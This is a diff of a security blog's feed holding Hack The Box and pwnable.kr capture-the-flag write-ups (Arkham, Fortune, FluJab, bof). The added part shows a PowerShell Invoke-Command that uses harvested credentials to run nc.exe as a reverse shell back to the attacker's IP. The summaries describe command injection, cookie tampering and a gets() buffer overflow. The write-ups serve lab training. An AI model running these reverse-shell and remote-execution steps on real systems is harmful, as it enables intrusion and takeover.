+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;so-we-can-use-powershells-invoke-command-with-the-credentials-we-have-to-get-a-reverse-shell--&quot;&gt;So we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;powershell&lt;/code&gt;’s &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; with the credentials we have to get a reverse shell  :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;powershell
+powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\&amp;gt; $username = 'batman'
+$username = 'batman'
+PS C:\&amp;gt; $password = 'Zx^#QZX+T!123'
+$password = 'Zx^#QZX+T!123'
+PS C:\&amp;gt; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
+PS C:\&amp;gt; $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
+PS C:\&amp;gt; Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1338 }                                      
+Invoke-command -computername ARKHAM -credential $credential -scriptblock { cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\nc.exe&quot; -e cmd.exe 10.10.xx.xx 1338 }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/14.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h3&gt;
+&lt;h4 id=&quot;batman-is-in-the-administrators-group-however-i-couldnt-read-the-flag-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Batman&lt;/code&gt; is in the Administrators group, however I couldn’t read the flag :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\Users\Batman\Documents&amp;gt;cd ../../Administrator/Desktop
+cd ../../Administrator/Desktop
+Access is denied.
+
+C:\Users\Batman\Documents&amp;gt;type C:\Users\Administrator\Desktop\root.txt 
+type C:\Users\Administrator\Desktop\root.txt
+Access is denied.
+
+C:\Users\Batman\Documents&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;that-was-weird-after-trying-a-lot-of-things-i-wanted-to-see-if-anything-will-change-if-i-mounted-c-then-accessed-it&quot;&gt;That was weird, after trying a lot of things I wanted to see If anything will change if I mounted &lt;code class=&quot;highlighter-rouge&quot;&gt;C$&lt;/code&gt; then accessed it.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\&amp;gt;net use Z: \\ARKHAM\C$
+net use Z: \\ARKHAM\C$
+The command completed successfully.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;and-yes-that-worked-&quot;&gt;And yes that worked :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/arkham/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-owned-root-&quot;&gt;We owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---fortune&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/fortune/&quot;&gt;Hack The Box - Fortune&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Web" /><category term="RCE" /><category term="Python" /><category term="Exploit Development" /><category term="smb" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Arkham retired and here’s my write-up about it. This box was a challenging one and I enjoyed it a lot, it had an interesting java deserialization vulnerability which is the best thing about this box. Despite the fact that some parts were annoying, this box was great. It’s a Windows box and its ip is 10.10.10.130, I added it to /etc/hosts as arkham.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC arkham.htb We have http on port 80, 8080 and smb, I checked smb first. SMB Let’s use smbclient to list the shares : ``` root@kali:~/Desktop/HTB/boxes/arkham# smbclient –list //arkham.htb/ -U “” Enter WORKGROUP's password:</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/arkham/0.png" /></entry><entry><title type="html">Hack The Box - Fortune</title><link href="http://localhost:4000/hack-the-box/fortune/" rel="alternate" type="text/html" title="Hack The Box - Fortune" /><published>2019-08-03T00:00:00+02:00</published><updated>2019-08-03T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/fortune</id><content type="html" xml:base="http://localhost:4000/hack-the-box/fortune/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-fortune-retired-and-heres-my-write-up-about-it-it-was-a-very-cool-box-and-i-really-liked-it-like-the-last-retired-box-lacasadepapel-it-had-rce-and-client-certificate-generation-to-access-a-restricted-https-service-but-thats-only-for-the-initial-steps-as-this-box-had-a-lot-of-interesting-stuff-its-an-openbsd-box-and-its-ip-is-101010127-i-added-it-to-etchosts-as-fortunehtb-lets-jump-right-in-&quot;&gt;Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box &lt;a href=&quot;/hack-the-box/lacasadepapel&quot;&gt;LaCasaDePapel&lt;/a&gt; it had &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; and client certificate generation to access a restricted &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.127&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;fortune.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -627,7 +1400,8 @@ root@kali:~/Desktop/HTB/boxes/fortune#
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---lacasadepapel&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/lacasadepapel/&quot;&gt;Hack The Box - LaCasaDePapel&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="BSD" /><category term="Web" /><category term="RCE" /><category term="Python" /><category term="Exploit Development" /><category term="Networking" /><category term="Pivoting ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box LaCasaDePapel it had RCE and client certificate generation to access a restricted https service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is 10.10.10.127, I added it to /etc/hosts as fortune.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC fortune.htb We have http, https on port 80, port 443 and we have ssh on port 22 so we will be focusing on the web services. HTTP Initial Enumeration The index page on http://fortune.htb is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database : On https://fortune.htb we get a handshake error, this probably means that we need a client certificate. RCE, Client Certificate Generation Back to http://fortune.htb I intercepted the request with burp and there was only one parameter in the POST request called db, after trying some different things I could get RCE by appending a semi-colon ; : Request : ``` POST /select HTTP/1.1 Host: fortune.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://fortune.htb/ Content-Type: application/x-www-form-urlencoded Content-Length: 7 Connection: close Upgrade-Insecure-Requests: 1</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/fortune/0.png" /></entry><entry><title type="html">Hack The Box - LaCasaDePapel</title><link href="http://localhost:4000/hack-the-box/lacasadepapel/" rel="alternate" type="text/html" title="Hack The Box - LaCasaDePapel" /><published>2019-07-27T00:00:00+02:00</published><updated>2019-07-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lacasadepapel</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lacasadepapel/">&lt;hr /&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---arkham&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/arkham/&quot;&gt;Hack The Box - Arkham&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="BSD" /><category term="Web" /><category term="RCE" /><category term="Python" /><category term="Exploit Development" /><category term="Networking" /><category term="Pivoting" /><category term="ssh" /><category term="php" /><summary type="html">Quick Summary Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box LaCasaDePapel it had RCE and client certificate generation to access a restricted https service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is 10.10.10.127, I added it to /etc/hosts as fortune.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC fortune.htb We have http, https on port 80, port 443 and we have ssh on port 22 so we will be focusing on the web services. HTTP Initial Enumeration The index page on http://fortune.htb is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database : On https://fortune.htb we get a handshake error, this probably means that we need a client certificate. RCE, Client Certificate Generation Back to http://fortune.htb I intercepted the request with burp and there was only one parameter in the POST request called db, after trying some different things I could get RCE by appending a semi-colon ; : Request : ``` POST /select HTTP/1.1 Host: fortune.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://fortune.htb/ Content-Type: application/x-www-form-urlencoded Content-Length: 7 Connection: close Upgrade-Insecure-Requests: 1</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/fortune/0.png" /></entry><entry><title type="html">Hack The Box - LaCasaDePapel</title><link href="http://localhost:4000/hack-the-box/lacasadepapel/" rel="alternate" type="text/html" title="Hack The Box - LaCasaDePapel" /><published>2019-07-27T00:00:00+02:00</published><updated>2019-07-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lacasadepapel</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lacasadepapel/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-lacasadepapel-retired-and-heres-my-write-up-about-it-it-was-an-easy-interesting-box-more-of-a-ctf-challenge-than-a-realistic-scenario-but-i-still-enjoyed-it-its-a-linux-box-and-its-ip-is-101010131-i-added-it-to-etchosts-as-lacasadepapelhtb-lets-jump-right-in-&quot;&gt;Hey guys today LaCasaDePapel retired and here’s my write-up about it. It was an easy interesting box, more of a ctf challenge than a realistic scenario but I still enjoyed it. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.131&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;lacasadepapel.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -4442,132 +5216,4 @@ screen &lt;span class=&quot;nt&quot;&gt;-ls&lt;/span&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---help&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/help/&quot;&gt;Hack The Box - Help&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---querier&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/querier/&quot;&gt;Hack The Box - Querier&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="SQLI" /><category term="ssh" /><category term="rbash" /><category term="Binary Exploitation" /><category term="c" /><summary type="html">Quick Summary Hey guys today FluJab retired and here’s my write-up about it. This machine had a lot of rabbit holes and trolls which made it hard to enjoy the machine. But without mentioning those annoying things this machine had some really cool web exploitation parts like cookie manipulation, authentication bypasses and most importantly an interesting SQL injection vulnerability. Ajenti administration panel was installed on the box and I could get credentials for it by exploiting the SQLi, After that I could use a user’s public ssh key to get the private key as it was vulnerable to CVE-2008-0166 then I escaped rbash and exploited a vulnerable version of screen to get a root shell. It’s a Linux box and its ip is 10.10.10.124, I added it to /etc/hosts as flujab.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC flujab.htb We got ssh on port 22, http on ports 80 and 8080 and https on port 443. There’s also some sort of virtual hosting as we can see from the nmap scan and there are a lot of domains … We can also check the ssl certificate manually : HTTP I added all of them to /etc/hosts and checked them, However I will skip the rabbit holes in the write-up because it’s just a waste of time. If we take a look at what we have : The machine name is flujab so we are only interested in : console.flujab.htb sys.flujab.htb smtp.flujab.htb freeflujab.htb flujab.htb We saw that error about direct ip access when we visited flujab.htb, Let’s check the other 4. console.flujab.htb : Just a troll ! sys.flujab.htb : The same error on flujab.htb smtp.flujab.htb : We don’t have any credentials for that. freeflujab.htb : That one is interesting. I tried to run gobuster but there was a wildcard response. When I checked manually I found that instead of responding with 404 it responds with a redirection to https://clownware.htb/cwerror_pages.php which has a gif of a strange creepy clown … Note : I checked them all on port 8080 too but I always got the direct ip access error. I started burp and configured the scope : Then I ran the spider : Results : I checked the requests and the responses of different pages and actions. I noticed in one of the responses a Set-Cookie header that sets a cookie called Modus and sets the path for it to /?smtp_config. I requested /?smtp_config in the browser and looked at the request in burp : Request : Response : The response was a redirection to /?denied. We are sending 3 cookies in every request : Modus , Patient and Registered. Modus and Registered are base-64 encoded strings while Patient is an md5 hash. Modus = Configure=Null Registered = f991b5fb6a2939471c7230b2db78225e=Null Registered is using the same hash from Patient, After some guesses I found that this hash is for my ip : Anyway we can try to change these values from Null to True and see what happens : Request : GET /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Response : HTTP/1.1 200 OK Date: Thu, 15 Jun 2019 10:34:17 GMT Content-Type: text/html; charset=UTF-8 Connection: close Server: ClownWare Proxy Content-Length: 3735 Great, we can access the page now. Before doing anything I noticed this message about the whitelist: I requested /?whitelist and looked at the response : My ip wasn’t there. Anyway I used python to run a debugging smtp server : python -m smtpd -n -c DebuggingServer 10.10.xx.xx:25 Then I went to update the smtp settings and add mine : But I got this message : A Valid SMTP Domain Address Is Required. So I checked the source of the form : &amp;lt;form method=&quot;post&quot; action=&quot;?smtp_config&quot;&amp;gt; &amp;lt;div class=&quot;row aln-center&quot;&amp;gt; &amp;lt;div class=&quot;col-6 &quot;&amp;gt; &amp;lt;input type=&quot;text&quot; name=&quot;mailserver&quot; id=&quot;email-server&quot; value=&quot;smtp.flujab.htb&quot; pattern=&quot;smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}&quot; title=&quot; A Valid SMTP Domain Address Is Required&quot;/&amp;gt; &amp;lt;input type=&quot;hidden&quot; name=&quot;port&quot; id=&quot;port&quot; placeholder=&quot;25&quot; value=&quot;25&quot; /&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;div class=&quot;col-12&quot;&amp;gt; &amp;lt;p&amp;gt; WARNING: Only &amp;lt;a href=&quot;/?whitelist&quot;&amp;gt;whitelisted sysadmins&amp;lt;/a&amp;gt; are authorized to access this page! &amp;lt;br \&amp;gt; If you are not supposed to change these settings then don't! whitelist will be auto-updated. &amp;lt;/p&amp;gt; &amp;lt;ul class=&quot;actions&quot;&amp;gt; &amp;lt;li&amp;gt;&amp;lt;input type=&quot;submit&quot; class=&quot;style1&quot; value=&quot;Save Mail Server Config&quot; name=&quot;save&quot; /&amp;gt;&amp;lt;/li&amp;gt; &amp;lt;/ul&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/form&amp;gt; It’s relying on client-side validation check : Which means that we can bypass it easily by sending the data directly in the request : Request : ``` POST /?smtp_config HTTP/1.1 Host: freeflujab.htb User-Agent: Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: Modus=Q29uZmlndXJlPVRydWU%3d; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQo%3d Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 59</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/flujab/0.png" /></entry><entry><title type="html">pwnable.kr - bof</title><link href="http://localhost:4000/pwn/bof/" rel="alternate" type="text/html" title="pwnable.kr - bof" /><published>2019-06-10T00:00:00+02:00</published><updated>2019-06-10T00:00:00+02:00</updated><id>http://localhost:4000/pwn/bof</id><content type="html" xml:base="http://localhost:4000/pwn/bof/">&lt;hr /&gt;
-
-&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
-&lt;h4 id=&quot;hey-guys-its-been-a-long-time-since-my-first-pwn-write-up--today-ill-write-about-another-challenge-from-pwnablekr-called-bof-it-was-a-simple-easy-buffer-overflow-challenge-you-can-also-check-these-by-overwriting-a-variable-we-can-get-a-shell-ill-also-write-a-small-exploit-with-pwntools-that-spawns-a-shell-automatically&quot;&gt;Hey guys it’s been a long time since my &lt;a href=&quot;https://0xrick.github.io/pwn/fd/&quot;&gt;first pwn write-up&lt;/a&gt;,  today I’ll write about another challenge from &lt;a href=&quot;https://pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; called bof. It was a simple easy buffer overflow challenge (You can also check &lt;a href=&quot;/categories/#binary-exploitation&quot;&gt;these&lt;/a&gt;), by overwriting a variable we can get a shell. I’ll also write a small exploit with &lt;code class=&quot;highlighter-rouge&quot;&gt;pwntools&lt;/code&gt; that spawns a shell automatically.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h3&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nana told me that buffer overflow is one of the most common software vulnerability. 
-Is that true?
-
-Download : http://pwnable.kr/bin/bof
-Download : http://pwnable.kr/bin/bof.c
-
-Running at : nc pwnable.kr 9000
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;pretty-straightforward-we-have-the-vulnerable-binary-its-source-code-and-the-port-where-its-running&quot;&gt;Pretty straightforward, we have the vulnerable binary, its source code and the port where it’s running.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;code-analysis&quot;&gt;Code Analysis&lt;/h3&gt;
-&lt;h4 id=&quot;lets-take-a-look-at-the-code-&quot;&gt;Let’s take a look at the code :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-void func(int key){
-	char overflowme[32];
-	printf(&quot;overflow me : &quot;);
-	gets(overflowme);	// smash me!
-	if(key == 0xcafebabe){
-		system(&quot;/bin/sh&quot;);
-	}
-	else{
-		printf(&quot;Nah..\n&quot;);
-	}
-}
-int main(int argc, char* argv[]){
-	func(0xdeadbeef);
-	return 0;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;there-are-two-functions-the-main-function-and-another-function-called-func&quot;&gt;There are two functions, the main function and another function called &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;func&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt;:&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void func(int key){
-	char overflowme[32];
-	printf(&quot;overflow me : &quot;);
-	gets(overflowme);	// smash me!
-	if(key == 0xcafebabe){
-		system(&quot;/bin/sh&quot;);
-	}
-	else{
-		printf(&quot;Nah..\n&quot;);
-	}
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;breakdown-&quot;&gt;Breakdown :&lt;/h4&gt;
-&lt;h4 id=&quot;the-function-takes-a-variable-called-key-it-starts-by-creating-a-variable-called-overflowme-and-sets-a-buffer-of-32-chars-for-it--char-overflowme32&quot;&gt;The function takes a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, it starts by creating a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; and sets a buffer of 32 chars for it : &lt;code class=&quot;highlighter-rouge&quot;&gt;char overflowme[32];&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;then-it-prints-overflow-me--printfoverflow-me----and-waits-for-our-input-which-will-be-saved-in-the-variable-overflowme-getsoverflowme&quot;&gt;Then it prints &lt;code class=&quot;highlighter-rouge&quot;&gt;overflow me :&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;overflow me : &quot;);&lt;/code&gt;)  and waits for our input which will be saved in the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;gets(overflowme);&lt;/code&gt;)&lt;/h4&gt;
-&lt;h4 id=&quot;after-that-theres-an-if-statement-that-checks-if-the-variable-key-is-equal-to-0xcafebabe-ifkey--0xcafebabe-if-thats-true-it-will-spawn-a-shell-systembinsh-if-key-is-equal-to-anything-else-it-will-print-nah-printfnahn&quot;&gt;After that there’s an if statement that checks if the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;if(key == 0xcafebabe){&lt;/code&gt;). If that’s true it will spawn a shell (&lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt;), if &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; is equal to anything else it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;Nah..&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;printf(&quot;Nah..\n&quot;);&lt;/code&gt;)&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;main-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main(int argc, char* argv[]){
-	func(0xdeadbeef);
-	return 0;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;basically-what-the-main-function-is-doing-is-just-calling-the-function-func-giving-key-the-value-of-0xdeadbeef&quot;&gt;Basically what the main function is doing is just calling the function &lt;code class=&quot;highlighter-rouge&quot;&gt;func()&lt;/code&gt; giving &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-we-need-to-make-key-equal-to-0xcafebabe-instead-of-0xdeadbeef-to-make-it-spawn-a-shell-we-control-overflowme-but-we-dont-control-key-if-we-can-cause-a-buffer-overflow-we-will-be-able-to-overwrite-key-and-obviously-overflowme-is-vulnerable&quot;&gt;So we need to make &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt; equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;0xcafebabe&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; to make it spawn a shell. We control &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; but we don’t control &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;. If we can cause a buffer overflow we will be able to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;, and obviously &lt;code class=&quot;highlighter-rouge&quot;&gt;overflowme&lt;/code&gt; is vulnerable.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;examining-the-binary-exploitation&quot;&gt;Examining the Binary, Exploitation&lt;/h3&gt;
-&lt;h4 id=&quot;i-ran-the-program-and-tested-it-a-couple-of-times-first-one-with-a-short-input-&quot;&gt;I ran the program and tested it a couple of times. First one with a short input :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;second-one-with-a-longer-input-and-it-crashed&quot;&gt;Second one with a longer input and it crashed:&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/pwn/bof/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;important-thing-to-note-here-we-dont-want-to-know-the-offset-or-where-the-program-exactly-crashes-this-is-because-we-dont-need-to-overwrite-eip-we-need-to-overwrite-a-variables-value-and-thats-located-on-the-stack-so-giving-the-program-a-pattern-and-finding-the-offset-wont-help-because-we-need-to-know-where-0xdeadbeef-is-located-on-the-stack&quot;&gt;Important thing to note here, we don’t want to know the offset or where the program exactly crashes. This is because we don’t need to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;EIP&lt;/code&gt;, we need to overwrite a variable’s value and that’s located on the stack. So giving the program a pattern and finding the offset won’t help because we need to know where &lt;code class=&quot;highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt; is located on the stack.&lt;/h4&gt;
-&lt;h4 id=&quot;its-time-for-gdb-i-started-gdb-and-created-a-break-point-at-main-break-main-then-i-started-the-program-r-&quot;&gt;It’s time for &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;. I started &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt; and created a break point at &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;break main&lt;/code&gt;) then I started the program (&lt;code class=&quot;highlighter-rouge&quot;&gt;r&lt;/code&gt;) :&lt;/h4&gt;
